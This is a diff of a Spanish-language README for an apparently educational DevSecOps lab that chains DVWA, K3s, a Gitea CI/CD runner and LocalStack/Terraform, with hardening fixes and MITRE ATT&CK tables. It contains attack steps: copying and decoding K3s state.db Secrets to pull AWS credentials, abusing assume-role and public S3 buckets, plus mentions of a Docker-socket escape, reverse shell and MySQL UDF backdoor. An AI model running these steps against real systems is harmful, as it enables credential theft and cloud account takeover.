+El otro hallazgo es `state.db`. K3s guarda el estado en Kine sobre SQLite en disco (`etcd` es opcional y aquí no está). Los Secrets están en base64 y sin cifrar en reposo mientras no actives `--secrets-encryption`, que viene apagado. Ojo con una cosa, no puedes abrir `state.db` directamente mientras K3s corre, SQLite lo tiene bloqueado y `sqlite3` te suelta `database is locked`, así que hay que copiarlo primero y leer la copia:
 
 ```bash
-sqlite3 /var/lib/rancher/k3s/server/db/state.db "SELECT name,value FROM kine WHERE name LIKE '%secrets%';"
+cp /var/lib/rancher/k3s/server/db/state.db /tmp/state.db
+sqlite3 /tmp/state.db "SELECT name,value FROM kine WHERE name LIKE '%secret%';"
 echo "<valor>" | base64 -d        # incluidas las credenciales AWS que usa el CI/CD
 ```
 
@@ -362,17 +397,15 @@ echo "<valor>" | base64 -d        # incluidas las credenciales AWS que usa el CI
 |---|---|---|---|
 | Privilege Escalation | Escape to Host | T1611 | PSA `restricted`; prohibir `hostPID`/`hostNetwork`/`hostPath` |
 | Credential Access | Unsecured Credentials: Kine DB | T1552.007 | `--secrets-encryption`; migrar a `etcd` cifrado |
-| Discovery | Permission Groups Discovery: K8s | T1069.003 | RBAC de mínimo privilegio; auditoría de bindings a `cluster-admin` |
-| Impact | Data Encrypted/Destruction (potencial) | T1486/T1485 | Backups inmutables; alertas sobre pods `privileged` |
 
-> **Nota.** Un pod con `privileged: true` y `hostPath: /` tiene acceso equivalente a root en el nodo. La abstracción que introduce Kubernetes no aporta aislamiento adicional frente al host cuando se permiten estas opciones; el control se ejerce mediante Pod Security Admission o políticas equivalentes.
+(RBAC y disponibilidad los cubro en la matriz completa, no aquí.) Un pod con `privileged: true` y `hostPath: /` es root en el nodo, sin más.
 
 </details>
 
 <details>
 <summary><strong>Capa 6 · IaC / Cloud</strong></summary>
 
-Con las credenciales AWS obtenidas de Kine (o del runner), los tres hallazgos que ya se leían en el código de la sección de Arquitectura pasan de configuración a explotación:
+Con las credenciales AWS que salen de Kine (o del runner), los tres hallazgos que ya se veían en el código de arquitectura dejan de ser teoría:
 
 ```bash
 export AWS_ACCESS_KEY_ID=<extraído>; export AWS_SECRET_ACCESS_KEY=<extraído>
@@ -387,9 +420,24 @@ aws sts assume-role --role-arn arn:aws:iam::000000000000:role/devsecops-unrestri
 aws s3 cp ./payload.txt s3://devsecops-public-data-bucket/ --no-sign-request   # sin credenciales
 ```
 
-De los tres hallazgos, `iam:PassRole` sin `Resource` acotado tiene una consideración particular. No consiste en tener permisos elevados, sino en poder asignar cualquier rol de la cuenta a cualquier servicio, lo que constituye una vía de escalada persistente. Un `AdministratorAccess` adjunto es visible en la primera auditoría; un usuario que aparenta bajo privilegio pero puede asumir cualquier rol bajo demanda es más difícil de detectar.
+> **⚠ El agujero honesto del lab.** LocalStack no aplica IAM por defecto. Salvo que arranques con `ENFORCE_IAM=1` (y aun así solo a medias), el `assume-role` con `Principal: "*"`, el `PassRole` sin `Resource`, el Block Public Access y la bucket policy tienen éxito igual en la versión vulnerable y en la endurecida, porque LocalStack te deja hacerlo de todas formas. O sea que el contraste vulnerable/hardened en cloud no demuestra nada a nivel de ejecución, solo que `tfsec`/`checkov` marcan el código. Lo pongo bien claro porque es la mayor limitación del lab, y es algo que asumo a propósito, no un descuido.
 
-Todas las condiciones que hacen posible la cadena (el Security Group abierto, el `docker.sock` en `0777`, los pods `privileged`) se despliegan desde este mismo Terraform de forma automatizada. El IaC es la última capa de la cadena y, a la vez, el origen de las condiciones de las capas anteriores.
+Qué es fiel y qué es teatro por culpa de LocalStack:
+
+| Pieza | ¿Se valida de verdad? |
+|---|---|
+| S3 put/get/listado | Sí, funciona de forma realista |
+| S3 Block Public Access | Parcial, el "público vs privado" no se enforcea como en AWS |
+| Evaluación de políticas IAM | No por defecto (necesita `ENFORCE_IAM=1`) |
+| `sts:AssumeRole` con trust policy | Teatro sin `ENFORCE_IAM`, asume el rol igualmente |
+| SG / reglas de red EC2 | Solo metadata, no hay filtrado de tráfico real |
+| Detección estática del código (`tfsec`/`checkov`) | Sí, y es lo que de verdad valida esta capa |
+
+El peor de los tres hallazgos es el `iam:PassRole` sin `Resource` acotado. Permite asignar cualquier rol de la cuenta a cualquier servicio, o sea escalada persistente. Y es el que más cuesta ver en una revisión, que un usuario con `AdministratorAccess` lo pilla cualquiera, pero este parece de bajo privilegio hasta que alguien lo usa para colgarse un rol gordo.
+
+Una nota práctica, contra LocalStack el `--endpoint-url` va en cada comando, que es un incordio, contra AWS de verdad esto iría directo. Lo aviso porque copiar y pegar sin el endpoint da errores raros que no dicen nada.
+
+Todo lo que hace posible la cadena sale de este mismo Terraform, desde el SG abierto hasta los pods `privileged`.
 
 #### Ficha de riesgo — IaC / Cloud
 
@@ -400,15 +448,13 @@ Todas las condiciones que hacen posible la cadena (el Security Group abierto, el
 | Initial Access | Trusted Relationship / Valid Accounts | T1199/T1078 | `Principal` explícito, nunca `"*"` |
 | Exfiltration | Exfiltration to Cloud Storage | T1567.002 | S3 Block Public Access a nivel de cuenta |
 
-> **Nota.** Ninguna de las técnicas de la cadena es un 0-day; todas explotan configuraciones documentadas. Cada paso aprovecha una decisión de configuración que resulta problemática al existir conectividad entre las capas. La cadena empieza con una subida de fichero y termina con acceso a la cuenta cloud.
-
 </details>
 
 ---
 
 ## Remediación y hardening
 
-Para cada vulnerabilidad se documenta el diff correspondiente, el control que restaura y el control sistémico que evita que ese tipo de error reaparezca en el siguiente ciclo de desarrollo. Corregir la línea afectada trata el síntoma; intervenir en el proceso que la generó trata la causa.
+Para cada fallo, el diff y el control que lo restaura. Donde tiene sentido, qué meter en el pipeline para que no se cuele otra vez.
 
 <p align="center">
   <img src="docs/animations/05-diff-toggle.gif" alt="Comparación entre la versión vulnerable y la endurecida del mismo fichero" width="820">
@@ -522,8 +568,7 @@ resource "aws_s3_bucket_server_side_encryption_configuration" "sse" {
 ```
 </details>
 
-**Control restaurado:** mínimo privilegio en las tres dimensiones de IAM (quién asume, qué delega, qué hace), denegación por defecto en red y cierre de la exposición de datos.
-**Control sistémico:** `tfsec`/`checkov` bloquean `Principal:*`, `PassRole Resource:*` y los adjuntos de admin antes del `apply`. El control con mejor relación impacto/esfuerzo de esta capa es S3 Block Public Access a nivel de cuenta, que invalida cualquier policy pública en todos los buckets con una sola configuración.
+Recupera el mínimo privilegio en IAM (asunción del rol y PassRole), el deny por defecto en red y el bucket cerrado. `tfsec`/`checkov` cortan `Principal:*`, `PassRole Resource:*` y los attach de admin antes del `apply`. El control de mayor cobertura por coste es S3 Block Public Access a nivel de cuenta, que anula cualquier bucket policy pública. Eso sí, como LocalStack no enforcea IAM (Capa 6), aquí el valor real de estos fixes lo pone el análisis estático y no la ejecución.
 
 </details>
 
@@ -548,8 +593,7 @@ resource "aws_s3_bucket_server_side_encryption_configuration" "sse" {
 +   lineinfile: { path: /etc/audit/rules.d/docker.rules, line: "-w /var/run/docker.sock -p rwxa -k docker_socket", create: yes }
 ```
 
-**Control restaurado:** el socket queda restringido a `root` y al grupo `docker`, y el firewall vuelve a denegar por defecto.
-**Control sistémico:** `ansible-lint` marca `mode: '0777'` y `ufw: disabled` como error en el pipeline; `inspec`/`auditd` lo validan tras el despliegue.
+Socket a `root:docker` `0660`, firewall a deny. `ansible-lint` marca el `0777` y el `ufw: disabled`, e `inspec`/`auditd` lo verifican tras el despliegue.
 
 </details>
 
@@ -586,8 +630,7 @@ curl -sfL https://get.k3s.io | sh -s - --secrets-encryption --write-kubeconfig-m
 k3s secrets-encrypt status   # → Encryption: enabled (AES-CBC 256)
 ```
 
-**Control restaurado:** ningún pod accede al daemon, al filesystem ni a los namespaces del host, y los Secrets dejan de ser legibles desde disco sin la clave.
-**Control sistémico:** PSA `restricted` rechaza `privileged`/`hostPath`/`hostPID`/`hostNetwork` en el propio API server; OPA Gatekeeper/Kyverno para políticas de imagen; Kaniko/Buildah para builds sin `docker.sock`.
+Ningún pod accede ya al daemon ni a los namespaces del host, y los Secrets no se leen del disco sin la clave. PSA `restricted` rechaza `privileged`/`hostPath`/`hostPID`/`hostNetwork` en el API server. Builds con Kaniko o Buildah, y políticas de imagen con Gatekeeper o Kyverno.
 
 </details>
 
@@ -607,7 +650,7 @@ k3s secrets-encrypt status   # → Encryption: enabled (AES-CBC 256)
 +     --token $(cat /run/secrets/runner-token)
 ```
 
-Mover los secretos a un `Secret` de Kubernetes mejora la situación, pero no elimina el problema de fondo: siguen siendo artefactos estáticos susceptibles de robo. La alternativa es no tener secretos estáticos, mediante OIDC federation:
+El paso intermedio es mover los secretos del ConfigMap a un `Secret` de Kubernetes. Sigue siendo un secreto estático, robable. La opción sin secretos estáticos es OIDC federation:
 
 ```yaml
 # workflow: credenciales temporales, sin claves estáticas
@@ -629,16 +672,15 @@ resource "aws_iam_role" "gitea_oidc_role" {
 }
 ```
 
-Con OIDC no queda ninguna credencial en ConfigMaps, Secrets, variables de entorno ni ficheros. El token es temporal (15 minutos por defecto), se genera en tiempo de ejecución para un repositorio y rama concretos y no es válido fuera de ese contexto. Un atacante que comprometa el runner obtiene credenciales que expiran en minutos, en lugar de claves de larga duración.
+Con OIDC no queda credencial en ConfigMaps, Secrets, entorno ni ficheros. El token se emite en ejecución para un repo y una rama, dura 15 min por defecto y no sirve fuera de ahí. Comprometer el runner da un token que caduca enseguida, o sea que sirve para poco.
 
-**Control restaurado:** configuración y credenciales separadas, con credenciales efímeras y acotadas al contexto de ejecución.
-**Control sistémico:** Gitleaks en pre-commit y en PR; `tfsec` sobre los roles OIDC; runners de un solo uso.
+Gitleaks en pre-commit y en PR, y `tfsec` sobre los roles OIDC.
 
 </details>
 
 ### Prevención, detección y respuesta
 
-Los diffs corrigen los síntomas concretos. El proceso que los generó (desarrollo sin revisión de seguridad, IaC sin pipeline de validación, runners configurados por comodidad) volverá a producir los mismos errores si no se interviene sobre él. La cobertura se organiza en tres frentes:
+Los diffs arreglan los casos concretos. El proceso que los generó (desarrollo sin revisión de seguridad, IaC que llega a producción sin ningún control por delante) los repetirá si nadie lo cambia. En tres bloques:
 
 ```
 ┌───────────────────────────────────────────────────────────────────┐
@@ -656,13 +698,13 @@ Los diffs corrigen los síntomas concretos. El proceso que los generó (desarrol
 └───────────────────────────────────────────────────────────────────┘
 ```
 
-La propiedad del IaC que amplifica el impacto de un error (se despliega de forma idéntica en todos los entornos) es la misma que abarata la corrección: un fix en `iam.tf` se aplica a todos los entornos a la vez, con trazabilidad en el historial de Git.
+Como el IaC se despliega igual en todos los entornos, un fix en `iam.tf` entra en todos a la vez y queda en el historial de Git.
 
 ---
 
 ## MITRE ATT&CK — cobertura
 
-La cadena cubre 11 de las 14 tácticas de la matriz Enterprise. Quedan fuera Impact, Resource Development y Reconnaissance, por tratarse de un entorno controlado sin objetivos externos. La tabla recoge una técnica representativa por táctica, correspondiente a explotación efectiva en el laboratorio.
+La cadena toca 11 de las 14 tácticas de la Matriz Enterprise. Fuera quedan Impact, Resource Development y Reconnaissance, por ser un entorno controlado sin objetivos externos. La tabla lista una técnica por táctica, todas con explotación real en el lab.
 
 | Táctica | Técnica representativa | ID | Detección característica |
 |---|---|---|---|
@@ -687,11 +729,59 @@ La cadena cubre 11 de las 14 tácticas de la matriz Enterprise. Quedan fuera Imp
 
 ## Notas técnicas
 
-**El fallo de mayor impacto no está en la capa expuesta.** DVWA está razonablemente aislado; el fallo crítico está tres capas más adentro, en un `docker.sock` montado para facilitar el desarrollo. La ubicación esperada del riesgo (la aplicación web) y su ubicación real no coinciden, lo que es relevante a la hora de priorizar una auditoría.
+A nivel de contenedor, el de DVWA es lo más aislado del lab (irónico, porque la aplicación es un queso gruyer...).
 
-**Interactuar con la Docker API sin CLI es un ejercicio de protocolo.** Sin `docker`, sin `curl` y sin utilidades de red, las peticiones REST se construyen a mano sobre el socket Unix con el módulo `socket` de Python. Varias decisiones (`alpine` en lugar de `mysql:5.7`, `NetworkMode: host` para evitar el NAT, `Binds` en lugar de `mount --bind`) resuelven fallos que no producen mensaje de error. Diagnosticar esos fallos silenciosos requirió más tiempo que el exploit final.
+Lo de la API de Docker sin CLI fue por protocolo: sin comandos como `docker` o `curl` y sin nada de red, las peticiones hay que hacerlas "a mano" sobre el socket con el módulo `socket` de Python. Y lo peor no fue eso, sino que los tres fallos que me tuvieron atascado (`alpine` en vez de `mysql:5.7`, `NetworkMode: host`, `Binds` en vez de `mount --bind`) no daban ningún error porque como comento antes el contenedor se crea, arranca, y simplemente no hace nada, solo tira un error silencioso en los logs. El del `NetworkMode` me comió una tarde entera; la reverse shell salía por el NAT de la bridge y se perdía...
 
-**El CI/CD suele quedar fuera del modelo de amenazas.** El pipeline tiene acceso legítimo a las credenciales de despliegue, y comprometerlo solo requiere una línea en un workflow YAML presentada como un paso de escaneo. En infraestructuras con despliegue continuo es uno de los vectores de mayor impacto, pese a no considerarse habitualmente un servidor de producción.
+El CI/CD casi nunca se ve en el modelo de amenazas, y es lo más sencillo, literalmente cuesta una línea de YAML.
+
+---
+
+## Diario de montaje
+
+Los fallos de arriba son los que forman parte del ataque. Estos otros son los que me di levantando la infra, que no salen en la cadena pero me comieron su buen rato y los dejo apuntados por si alguien monta algo parecido.
+
+<details>
+<summary><strong>Errores de montaje y cómo los resolví</strong></summary>
+
+**Gitea volvía una y otra vez al asistente de instalación, o se quedaba cargando al pulsar "Instalar".** La imagen rootless de Gitea no tiene permisos para escribir en `/etc/gitea/app.ini`, que es justo donde el asistente web guarda la config y donde Gitea intenta escribir sus secretos dinámicos (`INTERNAL_TOKEN`, `oauth2.JWT_SECRET`, `lfs.JWT_SECRET`) en el primer arranque. La solución fue saltarme el asistente entero, dejar toda la config en un `ConfigMap` con `INSTALL_LOCK = true` y todos esos secretos fijados a mano, y en vez de montar el `ConfigMap` directo sobre el `app.ini` (que queda de solo lectura) usar un `initContainer` que copia la plantilla a una ruta con escritura (`/var/lib/gitea/data/app.ini`). Aún así el copiado me dio otro `permission denied`, porque `busybox` corre como root y crea el fichero `root:root`, mientras que Gitea corre como el usuario `git` (UID 1000), así que metí un `chown -R 1000:1000` en el propio `initContainer` para que no vuelva a pasar. Y ojo, si recreas la `gitea.db` en pruebas el admin anterior desaparece, toca crear uno nuevo por CLI con `gitea admin user create ... --admin`.
+
+**La CPU al 100% con Docker y K3s a la vez.** K3s trae su propio containerd, y con el Docker del host encima los dos peleaban por los mismos cgroups. Se juntaba con que GitLab CE (que aún tenía puesto) pedía hasta 4 CPU y 8 GB. Lo resolví decidiendo runtime único, K3s sobre Docker (`--docker`), que además es lo que necesita el runner. De propina, al parar Docker a lo bruto se quedaron sockets y locks huérfanos en `/var/run/` y el daemon no arrancaba, se arregla borrando `docker.sock`, `docker.pid` y `containerd/*` y volviendo a levantarlo.
+
+**Se perdían usuarios, repos y el registro del runner al reiniciar la VM.** `gitea-data` ya iba en `hostPath`, pero el runner guardaba en `emptyDir` o en `/tmp`, que la VM puede limpiar al reiniciar. Moví el volumen del runner a `/var/lib/act-runner-data` (fuera de `/tmp`), con `DirectoryOrCreate` y permisos `1000:1000`.
+
+**Pipeline lentísimo, 10-20 minutos por ejecución.** Eran tres cosas a la vez, el runner iba corto (1 CPU / 1 GB), Trivy se bajaba su base de datos de vulnerabilidades entera en cada run, y las imágenes (`trivy`, `gitleaks`) no estaban pre-descargadas en el host. Subí el runner a 4 CPU / 4 GB, monté un volumen de caché para Trivy (`-v /tmp/trivy-cache:/root/.cache/`) e hice `docker pull` de las imágenes una vez.
+
+**Casi la lío con un rebase y pensé que había perdido todo el árbol de archivos.** Resolviendo un conflicto de rebase a favor de la versión que solo tenía el workflow, el puntero de `main` quedó apuntando a un commit sin el resto del código, y por un momento pareció que `src/` y `k8s/` se habían borrado. No se había perdido nada, era el puntero de rama, recuperable con `git reflog`. El error de verdad fue hacer un `git reset --hard` al commit equivocado sin mirar qué llevaba dentro, lo arreglé apuntando al commit bueno de verdad (`git reset --hard e7415a1` + `push --force`). La lección, mirar el contenido de un commit con `git show --stat` o `git ls-tree` antes de mover la rama a lo bestia.
+
+</details>
+
+---
+
+## Reset — dejar el lab limpio entre intentos
+
+El UDF abuse y el escape dejan rastro (la tabla `udf_blob`, la `.so` en el `plugin_dir` y contenedores `escape1` sueltos en el daemon del host), y ese rastro puede confundir un segundo pase, así que conviene limpiar antes de volver a empezar.
+
+```bash
+# 1 — Contenedores efímeros del escape (en el host)
+docker rm -f escape1 2>/dev/null || true
+
+# 2 — Rastro del UDF en MySQL
+mysql -u app -pvulnerables dvwa -e "DROP FUNCTION IF EXISTS sys_eval; DROP TABLE IF EXISTS udf_blob;"
+rm -f /usr/lib/mysql/plugin/udf_sys.so   # o la ruta que devolviera @@plugin_dir
+
+# 3 — Apps y clúster
+kubectl delete -f 04-cicd-pipeline/devsecops-demo/k8s/vulnerable/ --ignore-not-found
+kubectl delete -f 03-k8s-cluster/ --ignore-not-found
+
+# 4 — IaC y estado de LocalStack
+cd 01-cloud-iac/vulnerable && terraform destroy -auto-approve
+cd .. && docker-compose down -v          # -v borra el estado de LocalStack
+
+# 5 — Re-desplegar desde el paso 2 de "Despliegue"
+```
+
+Si arrancas LocalStack con `PERSISTENCE=1` el estado sobrevive al reinicio del contenedor y no se limpia con un simple `restart`, usa el `down -v` de arriba.
 
 ---
 
@@ -712,6 +802,20 @@ La cadena cubre 11 de las 14 tácticas de la matriz Enterprise. Quedan fuera Imp
 | LocalStack | 3.x | Emulador AWS (`docker-compose`) |
 | Kubectl / Python | 1.28+ / 3.10+ | Interacción con el clúster / scripts |
 | Kali (atacante) | Rolling | `192.168.252.20`; `netcat` requerido |
+
+Un par de cosas del provider de Terraform para LocalStack, que si no el `apply` falla con errores raros. Hay que apuntar los endpoints a LocalStack y saltarse las validaciones de credenciales:
+
+```hcl
+provider "aws" {
+  access_key = "test"; secret_key = "test"; region = "us-east-1"
+  skip_credentials_validation = true
+  skip_requester_check        = true
+  s3_use_path_style           = true
+  endpoints { s3 = "http://192.168.252.10:4566"; iam = "..."; ec2 = "..."; sts = "..." }
+}
+```
+
+Y desde dentro de un pod, el `--endpoint-url` tiene que apuntar a la IP del host (`192.168.252.10:4566`), no a `localhost`. Si quieres que el contraste vulnerable/hardened se note también en ejecución y no solo en el código, arranca LocalStack con `ENFORCE_IAM=1`, contando con que solo es parcial.
 
 ### Red
 
@@ -736,8 +840,8 @@ curl http://localhost:4566/_localstack/health | jq '.services | .s3,.iam,.ec2,.s
 # 3 — IaC vulnerable
 cd vulnerable && terraform init && terraform apply -auto-approve
 
-# 4 — K3s
-curl -sfL https://get.k3s.io | sh -
+# 4 — K3s (sobre Docker, runtime único)
+curl -sfL https://get.k3s.io | sh -s - --docker --disable metrics-server
 export KUBECONFIG=/etc/rancher/k3s/k3s.yaml && kubectl get nodes
 
 # 5 — Provisioning vulnerable
@@ -753,6 +857,7 @@ kubectl apply -f mysql-vulnerable.yaml -f dvwa-vulnerable.yaml
 
 # 8 — Configurar Gitea y subir el pipeline
 #     http://192.168.252.10:30000  →  git push del devsecops-demo
+#     El runner se registra contra la URL NodePort (30000), no contra el DNS interno del clúster.
 ```
 
 **El entorno está listo cuando:** LocalStack healthy (S3/IAM/EC2/STS) · K3s en `Ready` · pods `Running` en `vulnerable-apps` y `gitea` · DVWA accesible en nivel "Low" · `docker.sock` en `0777` · UFW inactivo.
@@ -782,4 +887,4 @@ cd 02-provisioning        && ansible-playbook -i inventory.ini site_hardened.yml
 
 ## Licencia
 
-MIT — exclusivamente para fines educativos y de demostración en entornos controlados y aislados. Usar estas técnicas contra sistemas sin autorización explícita del propietario es ilegal; el autor no asume responsabilidad por el uso fuera del contexto para el que fue diseñado.
+MIT — solo para fines educativos y de demostración en entornos controlados y aislados. Usar estas técnicas contra sistemas sin autorización explícita del propietario es ilegal; el autor no se hace responsable del uso fuera del contexto para el que se diseñó.
